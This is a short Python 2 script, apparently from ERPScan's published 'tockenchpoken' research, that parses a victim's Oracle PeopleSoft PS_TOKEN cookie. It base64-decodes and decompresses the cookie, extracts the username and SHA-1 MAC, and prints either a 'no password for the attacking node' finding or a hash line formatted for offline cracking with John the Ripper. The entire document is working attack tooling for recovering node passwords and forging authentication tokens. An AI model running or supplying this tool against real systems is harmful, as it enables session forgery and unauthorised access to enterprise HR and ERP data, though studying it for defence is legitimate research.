#!/usr/bin/python

import base64
import hashlib
import argparse
import zlib
import sys

# Use "generate.py from https://erpscan.com/wp-content/uploads/tools/ERPScan-tockenchpoken.zip
# to generate sample PS_TOKEN cookies.

print "Based on tokenchpoken v0.5 beta's parse.py file"
print 'Oracle PS_TOKEN cracker. Token parser'
print
print 'Alexey Tyurin - a.tyurin at erpscan.com'
print 'ERPScan Research Group - http://www.erpscan.com'
print
parser = argparse.ArgumentParser()
parser.add_argument('-c', action='store', dest='cookie', required=True,
                    help='Set a victim\'s PS_TOKEN cookie for parsing')

args = parser.parse_args()

input = args.cookie

full_str = base64.b64decode(input)
sha_mac = full_str[44:64].encode('hex')
inflate_data = full_str[76:]
data = zlib.decompress(inflate_data)

# parsing of compressed data
data_hash = hashlib.sha1(data).hexdigest()

user_length = data[20]
loc = 21
user = data[loc:loc + int(user_length.encode('hex'), 16)].replace("\x00", "")

# python generate.py -e 0 -u PS -l ENG -p "" -n PSFT_HR -d 2015-07-01-08.06.46
if data_hash == sha_mac:
    print "%s: there is no password for the attacking node!" % user
else:
    # print hash
    sys.stdout.write("%s:$dynamic_1600$%s$HEX$%s\n" % (user, sha_mac,
                                                       data.encode("hex")))
